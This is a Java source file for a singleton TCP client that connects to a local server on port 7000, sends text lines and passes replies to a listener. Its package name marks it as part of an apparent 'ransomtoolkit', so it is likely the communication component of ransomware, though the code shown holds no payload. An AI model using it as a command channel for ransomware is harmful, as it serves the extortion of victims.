package com.asef18766.ransomtoolkit;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;

public class TcpClient {

    public static final String TAG = TcpClient.class.getSimpleName();
    public static final String SERVER_IP = "127.0.0.1"; //server IP address
    public static final int SERVER_PORT = 7000;
    // message to send to the server
    private String mServerMessage;
    // sends message received notifications
    private OnMessageReceived mMessageListener;
    // while this is true, the server will continue running
    private boolean mRun = false;
    // used to send messages
    private PrintWriter mBufferOut;
    // used to read messages from the server
    private BufferedReader mBufferIn;
    // background running thread
    private Thread service = null;
    /**
     * Constructor of the class. OnMessagedReceived listens for the messages received from server
     */
    private TcpClient(OnMessageReceived listener) {
        mMessageListener = listener;
    }

    /**
     * Sends the message entered by client to the server
     *
     * @param message text entered by client
     */
    public void sendMessage(final String message) {
        Misc.LogDebug(TAG, "Sending: " + message);
        mBufferOut.println(message);
        mBufferOut.flush();
    }

    /**
     * Close the connection and release the members
     */
    public void stopClient() {

        mRun = false;
        service.interrupt();

        if (mBufferOut != null) {
            mBufferOut.flush();
            mBufferOut.close();
        }

        mMessageListener = null;
        mBufferIn = null;
        mBufferOut = null;
        mServerMessage = null;
    }
    private static TcpClient _instance = null;

    public static TcpClient GetInstance(OnMessageReceived handler)
    {
        if (_instance == null)
        {
            _instance = new TcpClient(handler);
            _instance.run();
        }
        return _instance;
    }

    private void run() {

        mRun = true;

        try {
            //here you must put your computer's IP address.
            InetAddress serverAddr = InetAddress.getByName(SERVER_IP);

            Misc.LogDebug("TCP Client", "C: Connecting...");

            //create a socket to make the connection with the server
            Socket socket = new Socket(serverAddr, SERVER_PORT);

            //sends the message to the server
            mBufferOut = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);

            //receives the message which the server sends back
            mBufferIn = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            Runnable runnable = new Runnable() {
                @Override
                public void run() {
                    //in this while the client listens for the messages sent by the server
                    while (mRun) {
                        try {
                            mServerMessage = mBufferIn.readLine();

                            if (mServerMessage != null && mMessageListener != null) {
                                //call the method messageReceived from MyActivity class
                                mMessageListener.messageReceived(mServerMessage);
                            }
                        } catch (Exception e) {
                            Misc.LogError("TCP", "S: Error", e);
                            break;
                        }
                    }
                }
            };
            Thread service = new Thread(runnable);
            service.start();

        } catch (Exception e) {
            Misc.LogError("TCP", "C: Error", e);
        }

    }

    //Declare the interface. The method messageReceived(String message) will must be implemented in the Activity
    //class at on AsyncTask doInBackground
    public interface OnMessageReceived {
        void messageReceived(String message);
    }

}